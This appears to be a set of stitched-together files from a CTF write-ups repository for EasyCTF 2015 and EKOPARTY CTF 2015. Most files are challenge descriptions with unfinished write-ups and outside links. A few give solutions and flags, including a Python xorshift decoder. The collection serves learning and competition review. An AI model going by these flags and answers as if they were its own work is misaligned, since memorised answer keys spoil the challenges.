* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/faster_math_325.md>
# EasyCTF 2015: Hello World! (20)

**Category:** Programming
**Points:** 20
**Solves:** 
**Description:**

> Use the programming interface to complete this task. Print the line `Hello, EasyCTF!` to a file called `hello-world.out`. For this problem and for future problems,&nbsp;**make sure your program ends with a newline**. Good luck!
> 
> 
> Hint: If you're really stuck, contact one of the mods on the [chat](https://www.easyctf.com/chat), or check out our [video tutorial](https://www.youtube.com/watch?v=GP1ZfzRSclQ)!


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/hello_world_20.md>
# EasyCTF 2015: If Logic (30)

**Category:** Programming
**Points:** 30
**Solves:** 
**Description:**

> Use the programming interface to complete this task. You&#39;ll be given a list of numbers.
> 
> 
> Input: A list of numbers, separated by commas.
> 
> 
> Output: Print `hi`if the number is 0-50 (inclusive), `hey` if the number is 51-100 (inclusive), and `hello` if anything else. Each greeting should have a linebreak after it.
> 
> 
> Read the input from a file called&nbsp;`if-logic.in`&nbsp;that&#39;s in the current working directory, and then write your output to a file called&nbsp;`if-logic.out`.
> 
> 
> Hint: If you need help, try looking at the Python Tutorial in the Learn section!


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/if_logic_30.md>
# EasyCTF 2015: Looking for Letters (65)

**Category:** Programming
**Points:** 65
**Solves:** 
**Description:**

> Use the programming interface to complete this task.
> 
> 
> Input: A string containing alphanumeric characters.
> 
> 
> Output: A string containing only the letters of the input.
> 
> 
> Read the input from a file called&nbsp;`looking-for-letters.in`&nbsp;that&#39;s in the current working directory, and then write your output to a file called&nbsp;`looking-for-letters.out`.
> 
> 
> Hint: If you need help, try looking at the Python Tutorial in the Learn section!


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/looking_for_letters_65.md>
# EasyCTF 2015: Math Class (50)

**Category:** Programming
**Points:** 50
**Solves:** 
**Description:**

> Use the programming interface to complete this task. You&#39;ll be given a math expression, such as `add 1 2` or `subtract 5 3`, where you will perform the operations `1+2` and `5-3`, respectively.
> 
> 
> ID:&nbsp;`math-class` 
> 
> 
> Input: An expression in the form of `operation operand1 operand2`, separated by spaces. Read input from `math-class.in`.
> 
> 
> Output: The **absolute** value of the evaluated&nbsp;expression. Your output should always be a positive integer.
> 
> 
> There are only 2 different possible operations, addition and subtraction, and all operands will be integer values between 1 and 1000. As always, remember to end your program with a newline.
> 
> 
> Hint: Two very useful functions are `int()` and `split()`. Read about them in the documentation.


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/math_class_50.md>
# EasyCTF 2015: Obfuscated (400)

**Category:** Programming
**Points:** 400
**Solves:** 
**Description:**

> How good are you at reading Python? Put your Python skills to the test by finding the password that passes this check: [obfuscated.py](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/obfuscated.py)
> 
> 
> Note: `easyctf{}` formatting is not required for this problem.
> 
> 
> Hint: Note: there may be multiple correct answers. The grader runs the same code that's in the given file.


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/obfuscated_400.md>
# EasyCTF 2015: Oink (85)

**Category:** Programming
**Points:** 85
**Solves:** 
**Description:**

> Use the programming interface to solve this problem.
> 
> 
> Pig Latin is a &quot;secret&quot; language in which English words are changed to sound foreign. Its rules are pretty simple:
> 
> 
> * If the English word begins with a vowel, add &quot;yay&quot; to the end.
> 
> * If the English word begins with a consonant, move the first letter to the end and then add &quot;ay&quot;.
> 
> 
> For example, &quot;Apples are Delicious&quot; becomes &quot;Applesyay areyay eliciousDay&quot;. Note: if you know a version of Pig Latin that uses a variation of rules different from the above rules, please use the above rules for this problem.
> 
> 
> Your job is to translate English input to Pig Latin output. For this exercise, keep capitalized letters capitalized, even when they are moved.
> 
> 
> ID: `piglatin1`
> 
> 
> Input: A sentence in English.
> 
> 
> Output: The translation in Pig Latin.
> 
> 
> Read the input from a file called&nbsp;`piglatin1.in`&nbsp;that&#39;s in the current working directory, and then write your output to a file called&nbsp;`piglatin1.out`.
> 
> 
> Hint: Words are defined as separated by spaces. :)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/oink_85.md>
# EasyCTF 2015: Oink Oink (115)

**Category:** Programming
**Points:** 115
**Solves:** 
**Description:**

> Use the programming interface to solve this problem.
> 
> 
> Now that we know how to convert from English to&nbsp;Pig Latin, can we reverse the translation? Given a sentence in Pig Latin, reverse it and try to find the original English text.
> 
> 
> Be careful to note that if a Pig Latin word is capitalized, like &quot;Arispay&quot;, the original English word is &quot;Paris&quot; rather than &quot;pAris&quot;. Case counts!
> 
> 
> ID: `piglatin2`
> 
> 
> Input: A sentence in Pig Latin.
> 
> 
> Output: The translation in English.
> 
> 
> Read the input from a file called&nbsp;`piglatin2.in`&nbsp;that&#39;s in the current working directory, and then write your output to a file called&nbsp;`piglatin2.out`.
> 
> 
> Hint: Work backwards! You'll probably need the `chr()` and `ord()` functions! Also, string splicing is pretty cool in Python ;)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/oink_oink_115.md>
# EasyCTF 2015: Sort-of Easy (50)

**Category:** Programming
**Points:** 50
**Solves:** 
**Description:**

> Use the programming interface to complete this task.
> 
> 
> Input: A list of numbers, separated by commas. Ex: `3,28,9,17,5`
> 
> 
> Output: The list sorted from largest to smallest, separated by commas. Ex: `28,17,9,5,3`
> 
> 
> Read the input from a file called&nbsp;`sorting-job.in`&nbsp;that&#39;s in the current working directory, and then write your output to a file called&nbsp;`sorting-job.out`.
> 
> 
> Hint: I wonder if there is a handy sort function for this? 


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/sort-of_easy_50.md>
# EasyCTF 2015: String Change (70)

**Category:** Programming
**Points:** 70
**Solves:** 
**Description:**

> Use the programming interface to complete this task. Given an array of 5 numbers, change every nth character, with n being the value of the first number of the array and the first letter of the string as the 1st character, of a string and move its value up by one (a turns into b, z turns into a). Repeat this for the rest of the numbers of the array and return the changed string. Do this for all the strings. Be careful to keep the original capitalization!
> 
> 
> For example: `[2,3,7,5,4]` and `oTerNmIWxGqaaV` would become `oUftOoJYyIqdaX`.
> 
> 
> ID: `string-change`
> 
> 
> Input: Read the input from a file called `string-change.in` that contains a string of: a list of 5 numbers separated by commas followed by a linebreak, and then a string of random characters.
> 
> 
> Output: The string changed according to the values in the list, written to a file called `string-change.out`.
> 
> 
> You already know this, but don&#39;t forget to end your output with a newline.
> 
> 
> Hint: First, look into string splitting, and the <code>ord()</code> and <code>chr()</code> functions!


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/string_change_70.md>
# EasyCTF 2015: Sum It! (30)

**Category:** Programming
**Points:** 
**Solves:** 
**Description:**

> Use the programming interface to complete this task. You'll be given a list of numbers.
> 
> 
> Input: A list of numbers, separated by commas.
> 
> Output: The sum of the numbers.
> 
> Read the input from a file called `addition.in` that's in the current working directory, and then write your output to a file called `addition.out`.
> 
> 
> Hint: If you need help, try looking at the Python Tutorial in the Learn section!


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/sum_it.md>
# EasyCTF 2015 write-ups

* <http://2015.easyctf.com/>
* [Scoreboard](http://2015.easyctf.com/scoreboard) or [local alternative](TODOLOCAL)
* [Writeup book by CTF organizers](http://writeups.easyctf.com/index.html), for download [here](https://www.gitbook.com/book/failedxyz/easyctf-2015-writeups/details)
* [List of local + external writeups on EasyCTF's github repo](https://github.com/EasyCTF/easyctf-2015-writeups)
* [List of easter eggs during the challenge](http://writeups.easyctf.com/easter_eggs.html)

## Completed write-ups

* [forensics/49-shades-of-gray](forensics/49-shades-of-gray)
* [forensics/a-picture-is-worth-a-thousand-words](forensics/a-picture-is-worth-a-thousand-words)
* [forensics/an-apple-a-day-keeps-the-dinosaur-away](forensics/an-apple-a-day-keeps-the-dinosaur-away)
* [forensics/corrupted](forensics/corrupted)
* [forensics/ispy](forensics/ispy)
* [forensics/liar](forensics/liar)
* [forensics/lolteam](forensics/lolteam)
* [forensics/pixels](forensics/pixels)
* [forensics/rest-in-pepperoni-pizzas](forensics/rest-in-pepperoni-pizzas)
* [forensics/sayonara](forensics/sayonara)
* [forensics/who-is-this-god](forensics/who-is-this-god)

## External write-ups only

* [binary-exploitation/adoughbee](binary-exploitation/adoughbee)
* [binary-exploitation/buffering](binary-exploitation/buffering)
* [binary-exploitation/much-studying](binary-exploitation/much-studying)
* [cryptography/all-zobs-fault](cryptography/all-zobs-fault)
* [cryptography/bigger-is-better](cryptography/bigger-is-better)
* [cryptography/black-table](cryptography/black-table)
* [cryptography/cave-johnson](cryptography/cave-johnson)
* [cryptography/h4sh3d](cryptography/h4sh3d)
* [cryptography/hardwood-floors](cryptography/hardwood-floors)
* [cryptography/i-love-sleeping](cryptography/i-love-sleeping)
* [cryptography/julius-save-me](cryptography/julius-save-me)
* [cryptography/known-plaintext-1](cryptography/known-plaintext-1)
* [cryptography/known-plaintext-2](cryptography/known-plaintext-2)
* [cryptography/known-plaintext-3](cryptography/known-plaintext-3)
* [cryptography/matrices](cryptography/matrices)
* [cryptography/misaka-mikoto](cryptography/misaka-mikoto)
* [cryptography/respiratory-sinus-arrythmia](cryptography/respiratory-sinus-arrythmia)
* [cryptography/xor](cryptography/xor)
* [cryptography/yves-fave-pic](cryptography/yves-fave-pic)
* [cryptography/zobs-password](cryptography/zobs-password)
* [forensics/accelerator](forensics/accelerator)
* [forensics/repetitive-strain-injury](forensics/repetitive-strain-injury)
* [linux/hijacked](linux/hijacked)
* [linux/mrrow](linux/mrrow)
* [linux/now-you-see-me-now-you-dont](linux/now-you-see-me-now-you-dont)
* [linux/same-difference](linux/same-difference)
* [linux/san-francisco-symphony](linux/san-francisco-symphony)
* [master-challenge/launch-code](master-challenge/launch-code)
* [miscellaneous/survey](miscellaneous/survey)
* [programming/can-you-even](programming/can-you-even)
* [programming/coordinates](programming/coordinates)
* [programming/easyctf-day](programming/easyctf-day)
* [programming/faster-math](programming/faster-math)
* [programming/hello-world](programming/hello-world)
* [programming/if-logic](programming/if-logic)
* [programming/looking-for-letters](programming/looking-for-letters)
* [programming/math-class](programming/math-class)
* [programming/obfuscated](programming/obfuscated)
* [programming/oink](programming/oink)
* [programming/oink-oink](programming/oink-oink)
* [programming/sort-of-easy](programming/sort-of-easy)
* [programming/string-chance](programming/string-chance)
* [programming/sum-it](programming/sum-it)
* [recon/ioexception](recon/ioexception)
* [web/2147483648-percent-secure](web/2147483648-percent-secure)
* [web/borkened](web/borkened)
* [web/easter](web/easter)
* [web/infinity-star](web/infinity-star)
* [web/personal-home-page](web/personal-home-page)
* [web/plot-twist](web/plot-twist)
* [web/pretty-horrible-programming](web/pretty-horrible-programming)
* [web/super-secure-lemons](web/super-secure-lemons)
* [web/teach-me-how-to-write-like-this](web/teach-me-how-to-write-like-this)
* [web/wastebin-1](web/wastebin-1)
* [web/wastebin-2](web/wastebin-2)
* [web/wastebin-3](web/wastebin-3)

## Missing write-ups# EasyCTF 2015: IOException (450)

**Category:** Recon
**Points:** 450
**Solves:** 
**Description:**

> My name is Michael Zhang.
> 
> 
> Hint: This is a recon problem. Clues are scattered over the internet, and you have to piece them together to solve the problem. THIS IS INSANELY HARD. If you solve this problem, you are required to write a write-up and send it (using the email you signed your team up with) to [failed.down@gmail.com](mailto:failed.down@gmail.com).


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/ioexception_450.md>
# EasyCTF 2015: 2147483648% Secure (35)

**Category:** Web
**Points:** 35
**Solves:** 
**Description:**

> Hack my friend's [website](https://www.easyctf.com/static/problems/intro-js/index.html)! From what she tells me, it's super secure. Why don't we prove her wrong :)
> 
> 
> Hint: Don't try to figure out what the messy JavaScript code means. [Developer tools](https://www.google.com/search?q=developer+tools) help a lot in things like this.


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/2147483648_secure_35.md>
# EasyCTF 2015: Borkened (400)

**Category:** Web
**Points:** 400
**Solves:** 
**Description:**

> There's a team that's breaking the rules and hiding flags on this site! Find the flag.
> 
> 
> Hint: the flag is on this site.

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/borkened_400.md>
# EasyCTF 2015: Easter (100)

**Category:** Web
**Points:** 100
**Solves:** 
**Description:**

> [page](https://www.easyctf.com/static/problems/easter/easter.html)
> 
> 
> Hint: Just look around.


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/easter_100.md>
# EasyCTF 2015: Infinity Star (375)

**Category:** Web
**Points:** 375
**Solves:** 
**Description:**

> Infinity Star Bank's [new website](http://web.easyctf.com:10206/) is up! In honor of their opening, they are offering a premium service that allows you to view flags.
> 
> 
> Important note: the account `michael` is an admin account.
> 
> 
> Hint: If the transfer money feature is still under testing, who do you think can use it?


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/infinity_star_375.md>
# EasyCTF 2015: Personal Home Page (225)

**Category:** Web
**Points:** 225
**Solves:** 
**Description:**

> [I hate PHP](http://web.easyctf.com:10200)
> 
> 
> Hint: You might not have permission to read the file, but someone else does ;)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/personal_home_page_225.md>
# EasyCTF 2015: Plot Twist (20)

**Category:** Web
**Points:** 20
**Solves:** 
**Description:**

> We need to get the flag at [this](https://www.easyctf.com/static/problems/plot-twist/index.html) site. That shouldn't be too hard.
> 
> 
> Hint: There must be a backup on that site SOMEWHERE . . . you just have to look harder

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/plot_twist_20.md>
# EasyCTF 2015: Pretty Horrible Programming (275)

**Category:** Web
**Points:** 275
**Solves:** 
**Description:**

> [I *still* hate PHP](http://web.easyctf.com:10201).
> 
> 
> Hint: How is the webpage checking your password?


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/pretty_horrible_programming_275.md>
# EasyCTF 2015: Super Secure Lemons (225)

**Category:** Web
**Points:** 225
**Solves:** 
**Description:**

> This [site](https://web.easyctf.com:10202) uses an encryption technology to keep its lemons super secure! On second thought, it might not be as secure as we thought.
> 
> 
> Hint: Why is your browser giving you that funny security message?


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/super_secure_lemons_225.md>
# EasyCTF 2015: Teach Me How to Write Like This (30)

**Category:** Web
**Points:** 30
**Solves:** 
**Description:**

> My friend Michelle found this cool new site, but you have to pay to read and she doesn't have money. Can you help her read the [fics](https://www.easyctf.com/static/problems/fandoms/index.html) anyways?
> 
> 
> Hint: Where can you find out what files are in a server?


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/teach_me_how_to_write_like_this_30.md>
# EasyCTF 2015: Wastebin 1 (90)

**Category:** Web
**Points:** 9
**Solves:** 
**Description:**

> I created a paste-sharing site the other day. Since client-side is faster, I decided to retrieve the entire database and store it client-side. No one should be able to see it, right? Prove me wrong by finding the admin password. [page](https://www.easyctf.com/static/problems/wastebin-1/index.html)
> 
> 
> Hint: What's wrong with storing things on the client's browser?


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/wastebin_1_90.md>
# EasyCTF 2015: Wastebin 2 (250)

**Category:** Web
**Points:** 250
**Solves:** 
**Description:**

> So after the previous fiasco, I decided to generate a random `admin` password, and hide it in a file that no one will ever find. And don't try Googling it either, cuz Google can't find it either! Hahaha >:) [Link](http://web.easyctf.com:10207/2/index.php)
> 
> 
> Hint: Where can you find out what files are in a server?


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/wastebin_2_250.md>
# EasyCTF 2015: Wastebin 3 (325)

**Category:** Web
**Points:** 325
**Solves:** 
**Description:**

> Hey I just learned this thing called MySQL! My `admin` account should be safe now! [Link](http://web.easyctf.com:10207/3/)
> 
> 
> Hint: What is [SQL](http://www.w3schools.com/sql/)?


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/wastebin_3_325.md>
# EKOPARTY CTF 2015: Weird Vigenere

**Category:** Crypto
**Points:** 100
**Solves:** 30
**Description:**

> Crack it!
> 
> Attachment: [crypto100.zip](./crypto100.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <http://www.nobbd.de/blog/artikel.php?titel=write-up-Ekoparty-CTF---Crypto-50-100-200#weirdvigenere>
* <https://research.g0blin.co.uk/ekoparty-ctf-2015-writeups/#cry-100-weird-vigenere>
# EKOPARTY CTF 2015: XOR Crypter

**Category:** Crypto
**Points:** 200
**Solves:** 160
**Description:**

> The state of art on encryption, can you defeat it?
>
> CjBPewYGc2gdD3RpMRNfdDcQX3UGGmhpBxZhYhFlfQA=
> 
> Attachment: [crypto200.zip](./crypto200.zip)


## Write-up

by [elliptic-shiho](https://github.com/elliptic-shiho)

Summary: Breaking XOR(-Right)-Shift

The "cryptor" is using XOR(-Right)-Shift.

XOR(-Right)-Shift is here.
```
y = enc(x) = x ^ (x >> 16)
```

this is very weak, and decrypt function is here:
```
dec(y) {
  x = y & (0b11111111111111111 << 16)
  x += (y ^ (res >> 16)) & (0b111111111111111)
  return x
}
```

so, I wrote this code to solve:

```python
import struct

# cipher text
ct = "CjBPewYGc2gdD3RpMRNfdDcQX3UGGmhpBxZhYhFlfQA=".decode("base64")

# decompose into 4 bytes.(and unpack)
c = []
while len(ct) > 0:
  c += [struct.unpack("I", ct[:4])[0]]
  ct = ct[4:]

# xor-(right)-shift decryptor
def dec_xorshift(x, b=16):
  res = x & (0b11111111111111111 << 32-b);
  res += (x ^ (res >> b)) & (0b111111111111111);
  return res

s = ""
for x in c:
  s += hex(dec_xorshift(x))[2:].replace("L", "").decode("hex")[::-1]
print s
```

flag is `EKO{unshifting_the_unshiftable}`

written by [@elliptic_shiho](https://twitter.com/elliptic-shiho)

## Other write-ups and resources

* <http://capturetheswag.blogspot.de/2015/10/ekoparty-2015-xor-crypter-crypto-200.html>
* <https://ctftime.org/writeup/2049>
* <https://en.internetwache.org/ekoparty-ctf-2015-writeups-24-10-2015/>
* <https://github.com/bl4de/ctf/blob/master/2015/Ekoparty_CTF_2015/XOR_Crypter_Crypto200.md>
* <https://github.com/p4-team/ctf/tree/master/2015-10-22-ekoparty/crpto_200_xorcrypter#eng-version>
* <https://github.com/pcchou/ctf-writeups/tree/master/2015/ekoparty/cry200>
* <http://www.nobbd.de/blog/artikel.php?titel=write-up-Ekoparty-CTF---Crypto-50-100-200#weirdvigenere>
* [Japanese](http://shiho-elliptic.tumblr.com/post/131769380689/ekoparty-ctf-2015-writeup)
# EKOPARTY CTF 2015: VBOX DIE

**Category:** Crypto
**Points:** 300
**Solves:** 38
**Description:**

> Someone is hidding a secret file on his system, help us finding the content of this file.
> 
> Attachment: [crypto300.zip](./crypto300.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctftime.org/writeup/2039>
* <https://research.g0blin.co.uk/ekoparty-ctf-2015-writeups/#cry300-vbox-die>
* [Japanese](http://shiho-elliptic.tumblr.com/post/131769380689/ekoparty-ctf-2015-writeup)
* [Vietnamese](https://blog.0x1115.org/2015/10/23/forensics-ekoparty-ctf-vbox-die-o-cung-may-ao-virtualbox-bi-ma-hoa/)
* [Romanian](http://pwn.ro/2015/ekoparty-ctf-2015-cry300.html) ([Cached version](http://webcache.googleusercontent.com/search?q=cache:2XByynkEI8YJ:pwn.ro/2015/ekoparty-ctf-2015-cry300.html+&cd=1&hl=de&ct=clnk&gl=de))
# EKOPARTY CTF 2015: Break the key

**Category:** Crypto
**Points:** 400
**Solves:** 1
**Description:**

> Do you have enough time?
> 
> Attachment: [crypto400.zip](./crypto400.zip)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# EKOPARTY CTF 2015: SCYTCRYPTO

**Category:** Crypto
**Points:** 50
**Solves:** 202
**Description:**

> Decrypt this strange word: ERTKSOOTCMCHYRAFYLIPL


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctftime.org/writeup/2038>
* <https://github.com/pcchou/ctf-writeups/tree/master/2015/ekoparty/cry50>
* <http://www.nobbd.de/blog/artikel.php?titel=write-up-Ekoparty-CTF---Crypto-50-100-200#weirdvigenere>
* <https://research.g0blin.co.uk/ekoparty-ctf-2015-writeups/#cry50-scytcrypto>
* [Japanese](http://shiho-elliptic.tumblr.com/post/131769380689/ekoparty-ctf-2015-writeup)
# EKOPARTY CTF 2015: Press it

**Category:** Misc
**Points:** 100
**Solves:** 53
**Description:**

> Recover the flag
> 
> Attachment: [misc100.zip](./misc100.zip)


## Write-up

by [elliptic-shiho](https://github.com/elliptic-shiho)

I got a mysterious text file. I guessed that is key scan code... Bingo!

decode by hand using this: http://www.computer-engineering.org/ps2keyboard/scancodes1.html

...and some minutes after, I got flag. We were First Solve!.
flag is `EKO{ibm_model_m}`

## Other write-ups and resources

* <https://en.internetwache.org/ekoparty-ctf-2015-writeups-24-10-2015/>
* <https://github.com/pcchou/ctf-writeups/tree/master/2015/ekoparty/misc100>
* [Japanese](http://shiho-elliptic.tumblr.com/post/131769380689/ekoparty-ctf-2015-writeup)
# EKOPARTY CTF 2015: Onion

**Category:** Misc
**Points:** 200
**Solves:** 1
**Description:**

> I got inspired by stallman's way of using the internet [1] so I created my own thing, have you ever heard of this little thing called The Onion Routing? read about it here http://ctfchallenges.ctf.site:10000/rms/
>
> [1] https://stallman.org/stallman-computing.html


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# EKOPARTY CTF 2015: Poltergeist

**Category:** Misc
**Points:** 300
**Solves:** 1
**Description:**

> Our friend just sent us this message, can you tell us who is it?
> 
> Attachment: [misc300.zip](./misc300.zip)


## Write-up

by Fernando Muñoz

The challenge included a video file inside the ZIP.

This video file was generated using [Tempest for Windows](https://cryptome.org/2015/09/tempest-test-for-windows.htm) and it plays the Mario Bross theme.

The easiest way to solve it is using an AM radio and playing the video, you will hear the song through it.

[![Video of solution](http://img.youtube.com/vi/hANcSbS7KwQ/0.jpg)](http://www.youtube.com/watch?v=hANcSbS7KwQ) 

Flag EKO{mario}

## Other write-ups and resources

* none yet
# EKOPARTY CTF 2015: Sharing is caring

**Category:** Misc
**Points:** 400
**Solves:** 0
**Description:**

> Just shared a file with a friend and got this pcap to prove it
> 
> Attachment: [misc400.zip](./misc400.zip)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# EKOPARTY CTF 2015: Olive

**Category:** Misc
**Points:** 50
**Solves:** 109
**Description:**

> Recover the flag from this session
> 
> Attachment: [misc50.zip](./misc50.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pcchou/ctf-writeups/tree/master/2015/ekoparty/misc50>
* <https://research.g0blin.co.uk/ekoparty-ctf-2015-writeups/#misc50-olive>
* <https://0x90r00t.com/2015/10/24/ekoparty-part-2-2015-misc50-olive-write-up/>
# EKOPARTY CTF 2015: Frecuency

**Category:** Pwnable
**Points:** 100
**Solves:** 28
**Description:**

> Analyze the output
>
> nc ctfchallenges.ctf.site 50002
> 
> Attachment: [pwn100.zip](./pwn100.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <http://pastebin.com/57ADMG4j>
# EKOPARTY CTF 2015: OTaaS

**Category:** Pwnable
**Points:** 200
**Solves:** 19
**Description:**

> Opcode Testing as a Service
>
> nc ctfchallenges.ctf.site 50001
> 
> Attachment: [pwn200.zip](./pwn200.zip)


## Write-up

(TODO)

## Other write-ups and resources

* [Japanese](http://shiho-elliptic.tumblr.com/post/131769380689/ekoparty-ctf-2015-writeup)
* <http://pastebin.com/yQpNAdwu>
* <http://pastebin.com/MnVDNXk8>
# EKOPARTY CTF 2015: File Manager

**Category:** Pwnable
**Points:** 300
**Solves:** 6
**Description:**

> This file manager system used to be a secure system, pwnt it!
>
> x86: file: [pwn300.zip](./pwn300.zip), nc ctfchallenges.ctf.site 50003
>
> x64: file: [pwn300_x64.zip](./pwn300_x64.zip), nc ctfchallenges.ctf.site 50005


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# EKOPARTY CTF 2015: Baby pwn

**Category:** Pwnable
**Points:** 50
**Solves:** 71
**Description:**

> Exploit for dummies!
>
> nc ctfchallenges.ctf.site 50004
> 
> Attachment: [pwn50.zip](./pwn50.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.whitehatters.academy/ekoparty-2015-baby/>
* <https://www.securifera.com/blog/2015/10/26/ekoparty-ctf-baby-pwn/> and a [reddit post](https://www.reddit.com/r/netsec/comments/3q8bzs/ekoparty_ctf_baby_pwn_writeup/)
* <https://gist.github.com/soez/4ee5eb07d4a3982815ad>
* <http://pastebin.com/jJdDTDKw>
* <http://pastebin.com/EMe9fFxj>
* <http://pastebin.com/t9uhve2D>
* <http://pastebin.com/8bAWzBGh>
* <http://pastebin.com/NJtim6SP>
* <http://pastebin.com/WAaa8Acn>
# EKOPARTY CTF 2015 CTF write-ups

* <https://ctf.ekoparty.org/>
* [Scoreboard](https://ctf.ekoparty.org/scoreboard) or [local alternative](./scoreboard)
* [Organizers blog with solutions to all challenges](http://blog.ioactive.com/2016/01/more-than-simple-game.html)

## Completed write-ups

* [crypto/cry200](crypto/cry200)
* [misc/misc100](misc/misc100)
* [misc/misc300](misc/misc300)
* [trivia/trv100](trivia/trv100)
* [trivia/trv50](trivia/trv50)

## External write-ups only

* [crypto/cry100](crypto/cry100)
* [crypto/cry300](crypto/cry300)
* [crypto/cry50](crypto/cry50)
* [misc/misc50](misc/misc50)
* [pwn/pwn100](pwn/pwn100)
* [pwn/pwn200](pwn/pwn200)
* [pwn/pwn50](pwn/pwn50)
* [reversing/rev100](reversing/rev100)
* [reversing/rev200](reversing/rev200)
* [reversing/rev300](reversing/rev300)
* [reversing/rev50](reversing/rev50)
* [reversing/rev500](reversing/rev500)
* [trivia/trv70](trivia/trv70)
* [trivia/trv80](trivia/trv80)
* [trivia/trv90](trivia/trv90)
* [web/web100](web/web100)
* [web/web300](web/web300)
* [web/web400](web/web400)
* [web/web50](web/web50)

## Missing write-ups

* [crypto/cry400](crypto/cry400)
* [misc/misc200](misc/misc200)
* [misc/misc400](misc/misc400)
* [pwn/pwn300](pwn/pwn300)
* [reversing/rev400](reversing/rev400)
* [web/web500](web/web500)# EKOPARTY CTF 2015: Counter

**Category:** Reversing
**Points:** 100
**Solves:** 41
**Description:**

> Count them all!
> 
> Attachment: [rev100.zip](./rev100.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://blog.0x80.org/ekoparty-rev100-rev300-writeup/>
# EKOPARTY CTF 2015: Malware

**Category:** Reversing
**Points:** 200
**Solves:** 36
**Description:**

> Analyze the given malware and steal its info
> 
> Attachment: [rev200.zip](./rev200.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ByteBandits/writeups/blob/master/ekoparty-ctf-2015/reversing/Malware/sudhackar/README.md>
* <https://research.g0blin.co.uk/ekoparty-ctf-2015-writeups/#rev200-malware>
# EKOPARTY CTF 2015: Dreaming

**Category:** Reversing
**Points:** 300
**Solves:** 9
**Description:**

> Flag it's hidden somewhere there
> 
> Attachment: [rev300.zip](./rev300.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://blog.0x80.org/ekoparty-rev100-rev300-writeup/>
# EKOPARTY CTF 2015: HOT

**Category:** Reversing
**Points:** 400
**Solves:** 1
**Description:**

> Our Blackberry application can accurately show you the weather status of the city! may you be able to get something more?
> 
> Attachment: [rev400.zip](./rev400.zip)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# EKOPARTY CTF 2015: Patch me

**Category:** Reversing
**Points:** 50
**Solves:** 103
**Description:**

> Find a way to read the corrupted image!
> 
> Attachment: [rev50.zip](./rev50.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ByteBandits/writeups/blob/master/ekoparty-ctf-2015/reversing/Patch%20me/sudhackar/README.md>
* <https://research.g0blin.co.uk/ekoparty-ctf-2015-writeups/#rev50-patch-me>
# EKOPARTY CTF 2015: Backdoor OS

**Category:** Reversing
**Points:** 500
**Solves:** 2
**Description:**

> You have found something unusual on the operating system, is the user hidding something more? (yes, it is the same file as crypto300!)
> 
> Attachment: [crypto300.zip](../../crypto/cry300/crypto300.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <http://gooverto.tistory.com/entry/EKOPARTY-Reversing-500-Writeup>
# EKOPARTY CTF 2015: Blocking truck

**Category:** Trivia
**Points:** 100
**Solves:** 110
**Description:**

> There is a blue truck blocking the event entrance, can you tell us what is the URL to contact them (as it can be seen)?


## Write-up

by [heticor915](https://github.com/heticor915)

What if you are not at the con? the right thing comes up, using the location available in  [official conference link](http://ekoparty.org/locacion.php ) and open the google street view and checking the entrance https://www.google.com.ar/maps/@-34.6066319,-58.4106205,3a,75y,37.19h,68.5t/data=!3m6!1e1!3m4!1sRlafT0kF9Zdees1SltvkYA!2e0!7i13312!8i6656!6m1!1e1 now you see the blue truck blocking the entrance :P,  you obtain the next url http://www.desimonehnos.com.ar :

